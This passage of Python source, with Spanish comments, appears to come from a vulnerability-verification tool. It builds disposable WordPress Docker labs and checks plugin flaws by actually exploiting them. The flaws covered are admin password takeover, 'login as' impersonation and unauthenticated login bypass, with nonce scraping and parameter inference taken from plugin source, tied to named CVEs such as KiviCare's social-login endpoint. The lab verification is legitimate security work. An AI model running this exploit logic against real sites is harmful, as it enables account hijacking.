         "usuarios, vista admin)...")
    if admin_sess is not None:
        capture(admin_sess, "/wp-admin/users.php",
               f"Paso 3: cuenta '{sub_user}' creada de verdad con rol {required_role} (vista de "
               f"la lista de usuarios del admin) -- el unico acceso que tiene el atacante "
               f"antes de explotar nada.",
               f"Step 3: account '{sub_user}' really created with the {required_role} role (admin's "
               f"user list view) -- the only access the attacker has before exploiting "
               f"anything.")

    _remaining = budget_s - (time.time() - t0)
    if _remaining < 30:
        step(f"BUDGET AGOTADO: solo {_remaining:.0f}s de {budget_s:.0f}s restantes -- "
             f"abortando verificacion antes del login/ataque")
        res.detail = "presupuesto de tiempo agotado antes de intentar el ataque"
        res.evidence["screenshots"] = shots
        return None

    step(f"iniciando sesion como '{sub_user}' (bajo privilegio)...")
    sess = _wp_login(base_url, sub_user, sub_pass, on_step=step)
    if sess is None:
        res.detail = ("no se pudo iniciar sesion como el usuario de bajo privilegio "
                      "(ver el motivo concreto en los pasos de arriba)")
        res.evidence["screenshots"] = shots
        return None
    res.logs.append(f"login subscriber: OK ({sub_user})")
    step("capturando pantalla: sesion del atacante ANTES del ataque (bajo privilegio)...")
    capture(sess, "/wp-admin/profile.php",
           f"Paso 4: sesion real como '{sub_user}' (subscriber, bajo privilegio) -- esta "
           f"cuenta es la unica que el atacante controla ANTES del ataque.",
           f"Step 4: real session as '{sub_user}' (subscriber, low-privilege) -- this is the "
           f"only account the attacker controls BEFORE the attack.")

    return _LabSession(lab=lab, base_url=base_url, admin_id=admin_id, admin_user=admin_user,
                       admin_pass=admin_pass, sub_user=sub_user, sub_pass=sub_pass,
                       sub_sess=sess, admin_sess=admin_sess, shots=shots, capture=capture,
                       shortcode_page_path=shortcode_page_path,
                       directory_hash=_um_hashed, db_pw=db_pw)


def verify_wordpress_account_takeover(
    plugin_source_dir: str, slug: str, endpoint: str, http_method: str,
    parameters, id_param_hint: str = "", email_param_hint: str = "", pass_param_hint: str = "",
    on_step: Optional[Callable[[str], None]] = None, budget_s: float = 1200.0,
    # 1200s (20 min): en Mac Apple Silicon, mysql:5.7/wordpress no tienen imagen arm64 nativa y
    # corren emulados (linux/amd64) via Docker Desktop -- el arranque de MySQL en la PRIMERA
    # ejecucion puede tardar varios minutos por si solo (ver mysql_ready). 600s se quedaba corto
    # y el laboratorio se desmontaba con MySQL aun inicializando, no realmente colgado.
    companion_plugins: Optional[list] = None,
    extra_nonce_pages: Optional[list] = None,
    extra_setup_trigger_paths: Optional[list] = None,
    shortcode_name: Optional[str] = None,
    keep_lab_on_failure: bool = False,
) -> WpVerifyResult:
    """Levanta WordPress+MySQL en Docker, instala el plugin ya descargado en `plugin_source_dir`
    (debe contener `<slug>/...`), crea un usuario subscriber y un admin, inicia sesion como el
    subscriber y envia la peticion de `endpoint`/`http_method`/`parameters` apuntando al ID del
    admin con un email/password nuevos. `verified=True` SOLO si un login posterior como admin con
    la password nueva funciona de verdad. Siempre desmonta el laboratorio al terminar.

    `shortcode_name`, si se da, crea una pagina real con el shortcode del plugin ANTES del
    ataque -- no para atacarla (este verificador siempre ataca `endpoint` tal cual), sino para
    que _auto_resolve_wp_blockers tenga una pagina real del plugin de donde rascar un nonce
    especifico de una accion AJAX concreta, ademas de las paginas genericas (login, portada) que
    nunca lo tienen -- confirmado en vivo, CVE-2024-1071 (ver verify_wordpress_sqli, donde se
    encontro por primera vez este mismo bloqueo de infraestructura, generico a cualquier
    verificador, no solo SQLi)."""
    step = on_step or (lambda _m: None)
    pre = _check_prereqs(plugin_source_dir, slug)
    if pre is not None:
        return pre
    res = WpVerifyResult()
    t0 = time.time()

    id_param = id_param_hint or _pick_param(parameters, _ID_HINTS)
    email_param = email_param_hint or _pick_param(parameters, _EMAIL_HINTS)
    pass_param = pass_param_hint or _pick_param(parameters, _PASS_HINTS)
    if not id_param or not (email_param or pass_param):
        res.detail = "no se identifico un parametro de ID y de email/password en la hipotesis"
        res.limitations.append("la verificacion de account-takeover necesita saber que parametro "
                               "lleva el ID objetivo y cual el email/password nuevos; afina "
                               "'parameters' en la hipotesis del LLM o pasalos a mano")
        return res

    lab = _Lab(_token())
    boot = None
    try:
        boot = _bootstrap_lab(lab, plugin_source_dir, slug, step, res, t0, budget_s,
                              companion_plugins=companion_plugins,
                              extra_setup_trigger_paths=extra_setup_trigger_paths,
                              shortcode_name=shortcode_name)
        if boot is None:
            return res

        m = (http_method or "POST").upper()
        base_params = dict(parameters) if isinstance(parameters, dict) else dict.fromkeys(parameters or [], "")
        endpoint, base_params = _auto_resolve_wp_blockers(
            boot, lab, slug, m, endpoint, base_params, id_param, res, step,
            extra_nonce_pages=extra_nonce_pages)

        new_email = f"takeover-{_token()}@binoracle-lab.invalid"
        new_pass = secrets.token_urlsafe(12)
        payload = dict(base_params)
        payload[id_param] = boot.admin_id
        if email_param:
            payload[email_param] = new_email
        if pass_param:
            payload[pass_param] = new_pass
        # evidencia REAL: el payload exacto que se envio de verdad (datos de un laboratorio
        # desechable, no de un objetivo real -- seguro de mostrar tal cual).
        res.evidence.update({
            "login_bajo_privilegio": boot.sub_user, "login_bajo_privilegio_password": boot.sub_pass,
            "admin_user": boot.admin_user, "admin_id": boot.admin_id,
            "id_param": id_param, "email_param": email_param or None, "pass_param": pass_param or None,
            "metodo": m, "endpoint": endpoint, "payload_enviado": dict(payload),
        })
        step(f"enviando la peticion {m} {endpoint} dirigida al admin (id={boot.admin_id})...")
        try:
            resp = boot.sub_sess.request(m, boot.base_url + endpoint,
                               data=payload if m != "GET" else None,
                               params=payload if m == "GET" else None, timeout=20)
            res.logs.append(f"peticion enviada: {resp.status_code}")
            res.evidence["status_code_respuesta"] = resp.status_code
            res.evidence["respuesta_cuerpo_recorte"] = (resp.text or "")[:300]
        except Exception as e:
            res.detail = f"fallo enviando la peticion: {e}"
            return res

        step("confirmando: intentando iniciar sesion como admin con la password nueva..." )
        confirm = _wp_login(boot.base_url, boot.admin_user, new_pass) if pass_param else None
        if confirm is not None:
            res.verified = True
            res.ok = True
            res.detail = (f"ACCOUNT TAKEOVER confirmado: login como '{boot.admin_user}' con la "
                          f"password fijada por la peticion funciono de verdad "
                          f"(admin_id={boot.admin_id})")
            res.evidence["password_nueva_confirmada"] = new_pass
            res.evidence["confirmacion"] = (f"login real como '{boot.admin_user}' con la password "
                                            f"'{new_pass}' funciono (cookie wordpress_logged_in_* "
                                            f"presente tras el POST a wp-login.php)")
            step("VERIFICADO: el login como admin con la password nueva funciono.")
            # Screenshot HTTP del endpoint atacado
            _capture_exploit_shot(
                boot, m, endpoint, resp, highlight=new_pass,
                caption_es=(f"Paso 4 (CLAVE): ACCOUNT TAKEOVER — endpoint acepto la peticion "
                            f"({resp.status_code}) con la nueva password '{new_pass}' "
                            f"para el usuario '{boot.admin_user}'."),
                caption_en=(f"Step 4 (KEY): ACCOUNT TAKEOVER — endpoint accepted the request "
                            f"({resp.status_code}) with new password '{new_pass}' "
                            f"for user '{boot.admin_user}'."))
            step("capturando pantalla: panel de WordPress YA como admin, con la password "
                 "fijada por el ataque (prueba final)...")
            boot.capture(confirm, "/wp-admin/",
                   f"Paso 5: ACCOUNT TAKEOVER confirmado -- panel de administracion completo de "
                   f"'{boot.admin_user}', accedido con la password que el ataque del paso 4 fijo, "
                   f"no con la password original del admin.",
                   f"Step 5: ACCOUNT TAKEOVER confirmed -- '{boot.admin_user}'s full admin panel, "
                   f"accessed with the password step 4's attack set, not the admin's original "
                   f"password.")
            step("capturando pantalla: la password ORIGINAL del admin ya NO funciona (prueba "
                 "de que el ataque la sobreescribio de verdad)...")
            old_pw_shot = _screenshot_failed_login(boot.base_url, boot.admin_user, boot.admin_pass)
            if old_pw_shot:
                boot.shots.append({
                    "caption_es": (f"Paso 6: intentar entrar como '{boot.admin_user}' con su "
                                   f"password ORIGINAL (la de antes del ataque) ahora FALLA -- "
                                   f"WordPress rechaza el formulario real de login, prueba de que "
                                   f"la password se sobreescribio de verdad, no que haya dos "
                                   f"validas."),
                    "caption_en": (f"Step 6: logging in as '{boot.admin_user}' with their "
                                   f"ORIGINAL password (from before the attack) now FAILS -- "
                                   f"WordPress rejects the real login form, proof the password "
                                   f"was really overwritten, not that two passwords are now "
                                   f"valid."),
                    "png_b64": old_pw_shot, "url": boot.base_url + "/wp-login.php",
                })
            res.evidence["screenshots"] = boot.shots
            res.evidence["http_captures"] = boot.http_captures
            return res

        # si no hay pass_param (solo email, p.ej.), confirma por wp-cli leyendo el email actual
        if email_param and not pass_param:
            cur = lab.wp_cli("user", "get", boot.admin_id, "--field=user_email",
                             timeout=20).stdout.strip()
            res.ok = True
            res.verified = (cur == new_email)
            res.evidence["email_nuevo_confirmado"] = new_email
            res.evidence["email_leido_tras_ataque"] = cur
            res.detail = (f"email del admin tras la peticion: {cur!r} "
                          f"(esperado: {new_email!r}) -> {'COINCIDE' if res.verified else 'no coincide'}")
            res.evidence["screenshots"] = boot.shots
            res.evidence["http_captures"] = boot.http_captures
            return res

        res.ok = True
        res.detail = "la peticion se envio pero no se pudo confirmar el efecto (login posterior fallo)"
        res.evidence["screenshots"] = boot.shots
        res.evidence["http_captures"] = boot.http_captures
        return res
    except subprocess.TimeoutExpired as e:
        res.detail = f"timeout de infraestructura: {e}"
        return res
    except Exception as e:
        res.detail = f"error inesperado: {e}"
        return res
    finally:
        _finalize_lab(lab, boot, res, step, keep_lab_on_failure)


def verify_wordpress_direct_login_as(
    plugin_source_dir: str, slug: str, endpoint: str, http_method: str,
    parameters, id_param_hint: str = "", confirm_path: str = "/wp-admin/users.php",
    on_step: Optional[Callable[[str], None]] = None, budget_s: float = 1200.0,
    companion_plugins: Optional[list] = None,
    extra_nonce_pages: Optional[list] = None,
    extra_setup_trigger_paths: Optional[list] = None,
    shortcode_name: Optional[str] = None,
    keep_lab_on_failure: bool = False,
) -> WpVerifyResult:
    """Verifica la OTRA forma de account-takeover por missing-authorization: un plugin cuya accion
    deja a un usuario de bajo privilegio CONVERTIRSE directamente en la sesion de otro usuario
    ("login as", p.ej. CVE-2024-43982 en Login As Users: `gwslau_login_as_user_action()` sin
    comprobacion de capability), en vez de cambiar una credencial. Aqui NO hay password nueva que
    confirmar por un segundo login (ver verify_wordpress_account_takeover() para ese otro caso);
    la confirmacion principal es, con la MISMA sesion del atacante (sin re-loguearse): esa sesion,
    que antes de la peticion NO podia ver `confirm_path` (pagina solo-admin), ahora SI la ve de
    verdad (HTTP 200, sin redirigir a wp-login.php y sin el mensaje de WordPress de 'no tienes
    permiso') -- ya se confirmo justo antes que esa misma pagina estaba denegada, asi que esta
    transicion por si sola es prueba fuerte. Se registra TAMBIEN si alguna cookie de la sesion
    cambio (evidencia de apoyo, no un requisito): distintos plugins suplantan de formas distintas
    -- algunos reemplazan la cookie de auth de WordPress (wordpress_logged_in_*), otros (como
    Login As Users, CVE-2024-43982: gwslau_login_as_user_action() guarda el ID en $_SESSION de PHP
    y lo aplica en cada peticion via el hook 'init') ni tocan esa cookie, solo la sesion nativa de
    PHP -- exigir el cambio de UNA cookie concreta habria dado un falso negativo contra ese CVE
    real (confirmado probando contra el plugin de verdad).
    Limitacion conocida: si el endpoint real exige un nonce de WordPress (`_wpnonce`) que no esta
    entre `parameters`, _auto_resolve_wp_blockers ya intenta rasparlo de cualquier pagina real
    publicada del sitio -- `shortcode_name`, si se da, crea una pagina real con el shortcode del
    plugin ANTES del ataque para que ese scraping tenga tambien una pagina que de verdad invoca
    el plugin (no solo login/portada genericas), de donde sacar el nonce de una accion AJAX
    concreta cuando ninguna otra pagina lo tiene (confirmado en vivo, CVE-2024-1071 -- ver
    verify_wordpress_sqli). Siempre desmonta el laboratorio al terminar."""
    step = on_step or (lambda _m: None)
    pre = _check_prereqs(plugin_source_dir, slug)
    if pre is not None:
        return pre
    res = WpVerifyResult()
    t0 = time.time()

    id_param = id_param_hint or _pick_param(parameters, _ID_HINTS)
    if not id_param:
        res.detail = "no se identifico el parametro que lleva el ID del usuario objetivo"
        res.limitations.append("la verificacion de login-as necesita saber que parametro lleva "
                               "el ID del usuario a suplantar; afina 'parameters' en la hipotesis "
                               "del LLM o pasalo a mano (id_param_hint)")
        return res

    lab = _Lab(_token())
    boot = None
    try:
        boot = _bootstrap_lab(lab, plugin_source_dir, slug, step, res, t0, budget_s,
                              companion_plugins=companion_plugins,
                              extra_setup_trigger_paths=extra_setup_trigger_paths,
                              shortcode_name=shortcode_name)
        if boot is None:
            return res

        # confirma que, ANTES del ataque, la sesion del subscriber NO puede ver la pagina
        # solo-admin -- sin esto, un confirm_path mal elegido (accesible por cualquiera) daria un
        # falso VERIFICADO.
        pre_resp = boot.sub_sess.get(boot.base_url + confirm_path, timeout=15,
                                     allow_redirects=True)
        pre_denied = (pre_resp.status_code != 200 or "wp-login.php" in pre_resp.url
                     or "do not have sufficient permissions" in pre_resp.text.lower()
                     or "sorry, you are not allowed" in pre_resp.text.lower())
        if not pre_denied:
            res.detail = (f"{confirm_path} ya era visible para el subscriber ANTES del ataque -- "
                          f"no sirve como confirmacion (prueba otra pagina solo-admin)")
            res.limitations.append("confirm_path debe ser una pagina que un subscriber normal NO "
                                   "pueda ver; con el valor dado no distingue nada")
            return res

        m = (http_method or "GET").upper()
        base_params = dict(parameters) if isinstance(parameters, dict) else dict.fromkeys(parameters or [], "")
        endpoint, base_params = _auto_resolve_wp_blockers(
            boot, lab, slug, m, endpoint, base_params, id_param, res, step,
            extra_nonce_pages=extra_nonce_pages)

        # TODAS las cookies, no solo wordpress_logged_in_*: distintos plugins suplantan por vias
        # distintas (ver docstring) -- esto es evidencia de apoyo, no el criterio de VERIFICADO.
        cookie_before = {c.name: c.value for c in boot.sub_sess.cookies}
        payload = dict(base_params)
        payload[id_param] = boot.admin_id
        res.evidence.update({
            "login_bajo_privilegio": boot.sub_user, "login_bajo_privilegio_password": boot.sub_pass,
            "admin_user": boot.admin_user, "admin_id": boot.admin_id, "id_param": id_param,
            "metodo": m, "endpoint": endpoint, "payload_enviado": dict(payload),
        })
        step(f"enviando la peticion {m} {endpoint} (login-as) dirigida al admin "
             f"(id={boot.admin_id})...")
        try:
            resp = boot.sub_sess.request(m, boot.base_url + endpoint,
                               data=payload if m != "GET" else None,
                               params=payload if m == "GET" else None, timeout=20)
            res.logs.append(f"peticion enviada: {resp.status_code}")
            res.evidence["status_code_respuesta"] = resp.status_code
            res.evidence["respuesta_cuerpo_recorte"] = (resp.text or "")[:300]
        except Exception as e:
            res.detail = f"fallo enviando la peticion: {e}"
            return res

        cookie_after = {c.name: c.value for c in boot.sub_sess.cookies}
        cookie_changed = cookie_before != cookie_after
        res.evidence["cookie_sesion_cambio"] = cookie_changed
        step("confirmando: la MISMA sesion del atacante, sin volver a loguearse, intenta ver "
             f"{confirm_path} (solo-admin)...")
        post_resp = boot.sub_sess.get(boot.base_url + confirm_path, timeout=15, allow_redirects=True)
        post_ok = (post_resp.status_code == 200 and "wp-login.php" not in post_resp.url
                  and "do not have sufficient permissions" not in post_resp.text.lower()
                  and "sorry, you are not allowed" not in post_resp.text.lower())
        res.evidence["confirm_path"] = confirm_path
        res.evidence["confirm_status_code"] = post_resp.status_code
        if post_ok:
            res.verified = True
            res.ok = True
            res.detail = (f"LOGIN-AS confirmado: la sesion de '{boot.sub_user}' (subscriber), que "
                          f"segundos antes NO podia ver '{confirm_path}', paso a tener acceso real "
                          f"tras la peticion -- SIN volver a loguearse (admin_id={boot.admin_id})")
            res.evidence["confirmacion"] = (f"la misma requests.Session, sin re-login, paso de "
                                            f"'denegado' a '200 OK' en {confirm_path}"
                                            + (" (y alguna cookie de la sesion cambio tras la "
                                               "peticion, evidencia de apoyo)" if cookie_changed
                                               else " (sin cambio de cookie detectable -- este "
                                               "plugin suplanta por otra via, p.ej. sesion nativa "
                                               "de PHP en vez de la cookie de auth de WordPress)"))
            step("VERIFICADO: la sesion del atacante ahora tiene acceso de administrador.")
            # Screenshot HTTP del endpoint atacado
            _capture_exploit_shot(
                boot, m, endpoint, resp if 'resp' in dir() else post_resp, highlight=boot.admin_user,
                caption_es=(f"Paso 4 (CLAVE): LOGIN-AS — endpoint aceptado; sesion de "
                            f"'{boot.sub_user}' (subscriber) escalada a admin."),
                caption_en=(f"Step 4 (KEY): LOGIN-AS — endpoint accepted; "
                            f"'{boot.sub_user}' session escalated to admin."))
            # Screenshot del endpoint de confirmación (acceso admin)
            _capture_exploit_shot(
                boot, "GET", confirm_path, post_resp, highlight="administrator",
                caption_es=(f"Paso 5a (CLAVE): ACCESO ADMIN CONFIRMADO — la misma sesion de "
                            f"'{boot.sub_user}' ahora puede ver '{confirm_path}' sin re-login."),
                caption_en=(f"Step 5a (KEY): ADMIN ACCESS CONFIRMED — '{boot.sub_user}' session "
                            f"now accesses '{confirm_path}' without re-login."))
            step("capturando pantalla: la MISMA sesion, ahora con acceso de administrador "
                 "(prueba final)...")
            boot.capture(boot.sub_sess, confirm_path,
                   f"Paso 5: LOGIN-AS confirmado -- la sesion de '{boot.sub_user}' (que antes del "
                   f"ataque no podia ver esta pagina) ahora accede a '{confirm_path}' sin haberse "
                   f"vuelto a loguear.",
                   f"Step 5: LOGIN-AS confirmed -- '{boot.sub_user}'s session (which could not see "
                   f"this page before the attack) now accesses '{confirm_path}' without logging "
                   f"in again.")
        else:
            res.ok = True
            res.detail = (f"la peticion se envio (status {resp.status_code}) pero {confirm_path} "
                          f"sigue denegado despues -- el login-as no se confirmo. Si el endpoint "
                          f"real exige un _wpnonce, incluyelo en 'parameters' (ver limitacion en "
                          f"el docstring de esta funcion)")
        res.evidence["screenshots"] = boot.shots
        res.evidence["http_captures"] = boot.http_captures
        return res
    except subprocess.TimeoutExpired as e:
        res.detail = f"timeout de infraestructura: {e}"
        return res
    except Exception as e:
        res.detail = f"error inesperado: {e}"
        return res
    finally:
        _finalize_lab(lab, boot, res, step, keep_lab_on_failure)


_sci = _SCI()


def _infer_missing_params_from_source(plugin_source_dir: str, slug: str,
                                       endpoint: str, missing_params: list,
                                       error_details: Optional[dict] = None) -> dict:
    """Delega al SourceCodeIntelligence del motor universal.
    Razonamiento en 3 capas: (1) mensaje de error REST, (2) codigo fuente del plugin,
    (3) defaults semanticos por nombre. No hay casos hardcodeados por CVE."""
    plugin_dir = os.path.join(plugin_source_dir, slug)
    if not os.path.isdir(plugin_dir):
        plugin_dir = plugin_source_dir

    defs = _sci.find_param_definitions(plugin_dir, missing_params)
    result = {}
    for param_name in missing_params:
        err_msg = ""
        if error_details and isinstance(error_details, dict):
            detail = error_details.get(param_name) or {}
            if isinstance(detail, dict):
                err_msg = detail.get("message") or ""
            else:
                err_msg = str(detail)
        result[param_name] = _sci.infer_valid_value(
            param_name, defs.get(param_name), err_msg
        )
    return result


def verify_wordpress_unauthenticated_login_bypass(
    plugin_source_dir: str, slug: str, endpoint: str, http_method: str,
    parameters, email_param_hint: str = "", victim_role: str = "subscriber",
    on_step: Optional[Callable[[str], None]] = None, budget_s: float = 1200.0,
    companion_plugins: Optional[list] = None,
    shortcode_name: Optional[str] = None,
    keep_lab_on_failure: bool = False,
) -> WpVerifyResult:
    """Verifica una TERCERA forma de missing-authorization, distinta de las dos anteriores
    (verify_wordpress_account_takeover cambia una credencial ajena con una sesion de bajo
    privilegio YA autenticada; verify_wordpress_direct_login_as suplanta a OTRO usuario por ID
    con una sesion de bajo privilegio YA autenticada): aqui NO hace falta NINGUNA sesion previa --
    el endpoint es publico (`permission_callback => '__return_true'` o equivalente) y deja al
    atacante autenticarse directamente como un usuario YA EXISTENTE con solo saber un dato suyo
    no secreto (tipicamente su email), sin validar la credencial/token que dice aportar contra
    nada real.

    Confirmado en vivo, CVE-2026-2991 (KiviCare para WordPress, AuthController::patientSocialLogin,
    endpoint POST /wp-json/kivicare/v1/auth/patient/social-login, permission_callback
    '__return_true'): busca un usuario existente por email/telefono, y si lo encuentra, llama
    wp_set_auth_cookie($user_id) sin comprobar el 'access_token' del proveedor social contra NADA
    -- cualquiera que conozca el email de un paciente ya registrado queda autenticado como el,
    sin password ni token real.

    `victim_role` crea una victima PROPIA (no reutiliza el subscriber generico de
    _bootstrap_lab) con ese rol exacto -- algunos plugins (KiviCare incluido) solo buscan/aceptan
    usuarios con un rol que ELLOS definen (p.ej. 'kiviCare_patient'), asi que un subscriber
    generico podria no ser un objetivo realista para el endpoint concreto; por eso es
    configurable en vez de fijo.

    Ataca con una sesion ANONIMA (sin login previo, a diferencia de los otros dos verificadores).
    `verified=True` SOLO si una pagina DISTINTA e independiente (`/wp-admin/profile.php`, propia
    de CUALQUIER usuario logueado, autenticacion solo por cookie -- nunca una ruta REST que
    pudiera exigir un nonce de por medio) confirma, con las cookies que la propia peticion de
    ataque dejo, que esa sesion esta autenticada como ese usuario exacto (su email real aparece
    en la pagina) -- nunca una deduccion por el codigo de estado del endpoint atacado, que puede
    devolver 200 (o incluso 403, si el plugin aplica una comprobacion de rol DESPUES de dejar el
    auth cookie puesto -- confirmado en vivo exactamente asi contra KiviCare: el login ya se
    hizo real antes de que el 403 se calculara) por razones ajenas al login en si. Siempre
    desmonta el laboratorio al terminar."""
    step = on_step or (lambda _m: None)
    pre = _check_prereqs(plugin_source_dir, slug)
    if pre is not None:
        return pre
    res = WpVerifyResult()
    t0 = time.time()

    email_param = email_param_hint or _pick_param(parameters, _EMAIL_HINTS)
    if not email_param:
        res.detail = "no se identifico el parametro de email de la victima en la hipotesis"
        res.limitations.append("la verificacion de login bypass no autenticado necesita saber "
                               "que parametro lleva el email de un usuario ya existente; afina "
                               "'parameters' en la hipotesis del LLM o pasalo a mano "
                               "(email_param_hint)")
        return res

    lab = _Lab(_token())
    boot = None
    try:
        boot = _bootstrap_lab(lab, plugin_source_dir, slug, step, res, t0, budget_s,
                              companion_plugins=companion_plugins, shortcode_name=shortcode_name)
        if boot is None:
            return res

        victim_user = f"binoracle_victim_{_token()}"
        victim_email = f"{victim_user}@binoracle-lab.invalid"
        step(f"creando la victima real (rol '{victim_role}', email conocido) a la que el "
             f"atacante nunca inicio sesion...")
        r_victim = lab.wp_cli("user", "create", victim_user, victim_email,
                              f"--role={victim_role}", timeout=30)
        if r_victim.returncode != 0:
            res.detail = (f"no se pudo crear la victima con rol '{victim_role}': "
                          f"{(r_victim.stderr or r_victim.stdout or '')[:300]}")
            res.limitations.append("confirma que victim_role es un rol real que el plugin "
                                   "objetivo registro al activarse")
            return res
        victim_id = lab.wp_cli("user", "get", victim_user, "--field=ID", timeout=30).stdout.strip()

        m = (http_method or "POST").upper()
        base_params = dict(parameters) if isinstance(parameters, dict) else dict.fromkeys(parameters or [], "")
        base_params[email_param] = victim_email
        res.evidence.update({
            "victima_user_id": victim_id, "victima_email": victim_email, "metodo": m,
            "endpoint": endpoint, "email_param": email_param, "payload_enviado": dict(base_params),
        })


        anon = _make_session()
        step(f"peticion ANONIMA (sin ninguna sesion previa) contra {m} {endpoint}, solo con el "
             f"email de una victima real '{victim_email}' -- ninguna credencial/token real...")
        try:
            resp = anon.request(m, boot.base_url + endpoint,
                                data=base_params if m != "GET" else None,
                                params=base_params if m == "GET" else None, timeout=20)
        except Exception as e:
            res.detail = f"fallo enviando la peticion: {e}"
            return res

        # Auto-remediacion: si WordPress REST rechaza con rest_missing_callback_param o
        # rest_invalid_param (param presente pero vacio o con valor invalido), extraemos los
        # params del cuerpo del error, buscamos en el codigo fuente del plugin los valores
        # validos (via grep al registration de la ruta), y reintentamos -- logica generica,
        # sirve para cualquier plugin WordPress que registre sus routes con 'required' o
        # 'validate_callback'. Maximo 3 iteraciones para no bucle infinito.
        import json as _json
        for _fix_attempt in range(3):
            if resp.status_code != 400:
                break
            try:
                _err = _json.loads(resp.text or "{}")
            except Exception:
                _err = {}
            _err_code = _err.get("code", "")
            # rest_missing_callback_param: params completamente ausentes del request
            if _err_code == "rest_missing_callback_param":
                _missing = _err.get("data", {}).get("params", [])
                _err_details: dict = {}
            # rest_invalid_param: params presentes pero con valor invalido (empty, wrong enum, etc.)
            elif _err_code == "rest_invalid_param":
                _missing = list((_err.get("data", {}).get("params") or {}).keys())
                _err_details = (_err.get("data", {}).get("details") or {})
            else:
                break
            if not _missing:
                break
            step(f"REST rechaza ({_err_code}): {_missing} -- buscando valores validos en "
                 f"fuente del plugin para reintentar (intento {_fix_attempt + 1}/3)...")
            _extra = _infer_missing_params_from_source(
                plugin_source_dir, slug, endpoint, _missing, error_details=_err_details)
            if not _extra:
                break
            base_params.update(_extra)
            step(f"reintentando con params corregidos/inferidos: {_extra}")
            try:
                resp = anon.request(m, boot.base_url + endpoint,
                                    data=base_params if m != "GET" else None,
                                    params=base_params if m == "GET" else None,
                                    timeout=20)
                res.evidence["payload_enviado"] = dict(base_params)
            except Exception as e:
                res.detail = f"fallo en reintento con params corregidos: {e}"
                return res

        res.evidence["status_code_respuesta"] = resp.status_code
        res.evidence["respuesta_cuerpo_recorte"] = (resp.text or "")[:500]
        if resp.status_code == 404:
            # Diagnostico: comprobar si el namespace kivicare/v1 esta registrado
            try:
                ns_resp = anon.get(boot.base_url + "/wp-json/", timeout=10)
                import json as _json
                try:
                    ns_data = _json.loads(ns_resp.text or "{}")
                    registered_ns = ns_data.get("namespaces", [])
                except Exception:
                    registered_ns = []
                step(f"debug: namespaces REST registrados: {registered_ns[:20]}")
            except Exception as _e:
                step(f"debug: no se pudo consultar /wp-json/: {_e}")
            # Leer debug.log de PHP para ver errores durante la peticion
            try:
                r_dbg = lab.sh("exec", lab.wp, "sh", "-c",
                               "tail -50 /var/www/html/wp-content/debug.log 2>/dev/null || echo '(debug.log vacio o inexistente)'",
                               timeout=15)
                step(f"debug.log (ultimas lineas): {(r_dbg.stdout or r_dbg.stderr or '')[:800]}")
            except Exception as _e:
                step(f"debug: no se pudo leer debug.log: {_e}")

        # confirmacion por COOKIE sola, nunca por un nonce REST -- bug real encontrado en vivo
        # escribiendo el test de este verificador: /wp-json/wp/v2/users/me exige un X-WP-Nonce
        # valido incluso con la cookie de sesion correcta (rest_cookie_check_errors, anti-CSRF),
        # y ese nonce solo sale bien formado en la respuesta del propio endpoint atacado si ESE
        # codigo hace un truco especifico (reescribir $_COOKIE[LOGGED_IN_COOKIE] en el mismo
        # request antes de llamar wp_create_nonce) -- la KiviCare real SI lo hace, pero exigirlo
        # habria dado un FALSO NEGATIVO contra cualquier plugin vulnerable que no lo haga, aunque
        # la cookie de sesion fuera perfectamente real y valida. /wp-admin/profile.php, en
        # cambio, es una pagina HTML (nunca una ruta REST) que CUALQUIER usuario logueado puede
        # ver de su PROPIO perfil -- autenticacion solo por cookie, sin nonce de ningun tipo
        # (mismo mecanismo ya usado por verify_wordpress_direct_login_as) -- y siempre imprime el
        # email real del usuario actual en un campo del formulario, asi que basta para confirmar
        # la IDENTIDAD exacta, no solo "alguna sesion quedo logueada".
        step("confirmando identidad con una pagina DISTINTA e independiente "
             "(/wp-admin/profile.php, solo cookie, sin nonce), nunca una deduccion por el codigo "
             "de estado del propio endpoint atacado...")
        try:
            prof = anon.get(boot.base_url + "/wp-admin/profile.php", timeout=15,
                           allow_redirects=True)
        except Exception as e:
            res.detail = f"fallo confirmando identidad: {e}"
            return res
        res.evidence["profile_status"] = prof.status_code
        logged_in_as_someone = (prof.status_code == 200 and "wp-login.php" not in prof.url)
        identity_matches = logged_in_as_someone and victim_email in prof.text

        res.ok = True
        if victim_id and identity_matches:
            res.verified = True
            res.detail = (f"LOGIN BYPASS NO AUTENTICADO confirmado: una peticion SIN sesion "
                          f"previa, aportando solo el email de una victima real (sin password ni "
                          f"token validos), dejo esa sesion autenticada como el usuario real "
                          f"id={victim_id} -- confirmado por /wp-admin/profile.php (solo cookie, "
                          f"sin nonce), que muestra el email real de esa victima exacta, no por "
                          f"el {resp.status_code} del propio endpoint atacado")
            step(f"VERIFICADO: /wp-admin/profile.php confirma la identidad de '{victim_email}' "
                 f"sin que el atacante aportara ninguna credencial real.")
            # Screenshot HTTP del endpoint atacado + perfil de verificación
            _capture_exploit_shot(
                boot, http_method or "POST", endpoint, resp, highlight=victim_email,
                caption_es=(f"Paso 5 (CLAVE): AUTH BYPASS CONFIRMADO — el endpoint devolvio "
                            f"{resp.status_code} sin credenciales reales para '{victim_email}'."),
                caption_en=(f"Step 5 (KEY): AUTH BYPASS CONFIRMED — endpoint returned "
                            f"{resp.status_code} without real credentials for '{victim_email}'."))
            _capture_exploit_shot(
                boot, "GET", "/wp-admin/profile.php", prof, highlight=victim_email,
                caption_es=(f"Paso 6 (CLAVE): IDENTIDAD CONFIRMADA — /wp-admin/profile.php "
                            f"muestra el email real '{victim_email}' — sesion activa como victima."),
                caption_en=(f"Step 6 (KEY): IDENTITY CONFIRMED — /wp-admin/profile.php shows "
                            f"victim email '{victim_email}' — session active as victim."))
        else:
            res.detail = (f"la peticion no autenticada devolvio {resp.status_code} pero "
                          f"/wp-admin/profile.php no confirmo la identidad de la victima "
                          f"(logueado como alguien: {logged_in_as_someone})")
        if boot is not None:
            res.evidence["screenshots"] = boot.shots
            res.evidence["http_captures"] = boot.http_captures
        return res
    except subprocess.TimeoutExpired as e:
        res.detail = f"timeout de infraestructura: {e}"
        return res
    except Exception as e:
        res.detail = f"error inesperado: {e}"
        return res
    finally:
        _finalize_lab(lab, boot, res, step, keep_lab_on_failure)


_HTML_FOLLOWABLE_RE = re.compile(r'(?:src|href)\s*=\s*["\']([^"\']+)["\']', re.IGNORECASE)


def _extract_followable_urls(text: str, base_url: str = "") -> List[str]:
    """Candidatas a URL donde un endpoint pudo haber COPIADO el fichero objetivo en vez de
    reflejar su contenido en esta misma respuesta. Confirmado en vivo (CVE-2024-50508,
    Woocommerce Product Design): el manejador vulnerable no devuelve el contenido leido -- copia
    el fichero objetivo a una ruta publica nueva y devuelve DONDE quedo ({"url": "...",
